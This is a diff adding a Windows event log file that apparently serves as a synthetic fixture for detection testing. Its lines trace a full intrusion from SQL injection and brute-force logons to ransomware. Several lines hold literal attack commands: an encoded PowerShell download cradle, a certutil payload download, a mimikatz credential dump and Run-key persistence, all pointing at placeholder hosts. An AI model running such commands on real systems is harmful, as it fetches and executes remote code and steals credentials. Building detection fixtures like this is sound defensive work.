@@ -1,0 +1,29 @@
+2026-03-15 08:12:00 WORKSTATION-01 Microsoft-Windows-IIS: web request: GET /api/v1/login?user=admin' OR 1=1-- HTTP/1.1 from 192.168.1.105 status 403 web attack SQL injection attempt
+2026-03-15 08:14:10 WORKSTATION-01 Microsoft-Windows-Security-Auditing: event_id=4625 logon failure user=Administrator source_ip=192.168.1.105 workstation=WORKSTATION-01 status=0xC000006D failed login
+2026-03-15 08:14:22 WORKSTATION-01 Microsoft-Windows-Security-Auditing: event_id=4625 logon failure user=Administrator source_ip=192.168.1.105 workstation=WORKSTATION-01 status=0xC000006D failed login
+2026-03-15 08:14:35 WORKSTATION-01 Microsoft-Windows-Security-Auditing: event_id=4625 logon failure user=Administrator source_ip=192.168.1.105 workstation=WORKSTATION-01 status=0xC000006D failed login
+2026-03-15 08:14:48 WORKSTATION-01 Microsoft-Windows-Security-Auditing: event_id=4625 logon failure user=Administrator source_ip=192.168.1.105 workstation=WORKSTATION-01 status=0xC000006D failed login
+2026-03-15 08:15:02 WORKSTATION-01 Microsoft-Windows-Security-Auditing: event_id=4625 logon failure user=Administrator source_ip=192.168.1.105 workstation=WORKSTATION-01 status=0xC000006D failed login
+2026-03-15 08:15:20 WORKSTATION-01 Microsoft-Windows-Security-Auditing: event_id=4624 login successful user=Administrator source_ip=192.168.1.105 workstation=WORKSTATION-01 logon_type=3
+2026-03-15 08:15:45 WORKSTATION-01 Microsoft-Windows-Security-Auditing: event_id=4672 special privileges assigned user=Administrator runas=SYSTEM privilege escalation
+2026-03-15 08:16:15 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=1 process created user=Administrator image="C:\Windows\System32\cmd.exe" cmdline="powershell.exe -encodedcommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC41MC9wYXlsb2FkLnBzMScp" pid=4520 ppid=1024
+2026-03-15 08:16:40 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=1 process created user=Administrator image="C:\Windows\System32\certutil.exe" cmdline="certutil -urlcache -split -f http://198.51.100.50/payload.exe C:\temp\payload.exe" pid=4810 ppid=4520
+2026-03-15 08:16:55 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=11 file created user=Administrator file="C:\temp\payload.exe" process="certutil.exe" pid=4810
+2026-03-15 08:17:30 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=1 process created user=Administrator image="C:\temp\payload.exe" cmdline="rundll32.exe C:\temp\payload.exe,DllMain" pid=5104 ppid=4520
+2026-03-15 08:18:00 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=3 network connection user=Administrator process="rundll32.exe" src_ip=192.168.1.105 dest_ip=198.51.100.50 port=443 proto=TCP outbound connection to c2 beacon
+2026-03-15 08:18:30 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=22 dns query user=Administrator process="rundll32.exe" domain=c2-beacon.darknet-relay.org query_status=0
+2026-03-15 08:19:15 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=13 registry value set user=Administrator process="reg.exe" target="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate" details="C:\temp\payload.exe"
+2026-03-15 08:20:00 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=10 process created user=Administrator image="C:\temp\mimikatz.exe" cmdline="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit" lsass access memory dump
+2026-03-15 08:21:15 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=3 network connection user=svc_backup src_ip=192.168.1.105 dest_ip=192.168.1.200 port=445 proto=TCP outbound connection
+2026-03-15 08:22:00 WORKSTATION-01 Microsoft-Windows-Security-Auditing: event_id=4624 login successful user=svc_backup source_ip=192.168.1.105 workstation=SERVER-DC01 logon_type=3
+2026-03-15 08:23:10 WORKSTATION-01 Microsoft-Windows-Storage: event_id=20001 usb insert removable media mass storage device connected: Kingston DataTraveler on WORKSTATION-01
+2026-03-15 08:23:45 WORKSTATION-01 Microsoft-Windows-Kernel-File: file copied from C:\Confidential\financial_q4.xlsx to E:\financial_q4.xlsx by user Administrator on WORKSTATION-01
+2026-03-15 08:24:15 WORKSTATION-01 Microsoft-Windows-Kernel-File: file copied from C:\Confidential\customer_db.sql to E:\customer_db.sql by user Administrator on WORKSTATION-01
+2026-03-15 08:25:00 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=3 network connection user=Administrator src_ip=192.168.1.105 dest_ip=203.0.113.88 port=8443 proto=TCP outbound connection large data transfer detected
+2026-03-15 08:25:40 WORKSTATION-01 Microsoft-Windows-Security-Auditing: event_id=4720 account created user=Administrator new_user=backdoor_admin target_domain=WORKSTATION-01
+2026-03-15 08:26:10 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=23 file deleted user=Administrator file="C:\temp\payload.exe" process="cmd.exe"
+2026-03-15 08:26:30 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=23 file deleted user=Administrator file="C:\temp\mimikatz.exe" process="cmd.exe"
+2026-03-15 08:27:00 WORKSTATION-01 Microsoft-Windows-Security-Auditing: event_id=1102 security audit log cleared user=Administrator on WORKSTATION-01
+2026-03-15 08:27:30 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=2 file modified user=Administrator file="C:\Confidential\financial_q4.xlsx.encrypted" ransomware indicator
+2026-03-15 08:27:45 WORKSTATION-01 Microsoft-Windows-Sysmon: event_id=11 file created user=Administrator file="C:\Users\Administrator\Desktop\README_RECOVER.txt" ransom note
+2026-03-15 08:28:15 WORKSTATION-01 Microsoft-Windows-Windows-Firewall: firewall blocked connection outbound to 203.0.113.99 port=4444 dropped packet
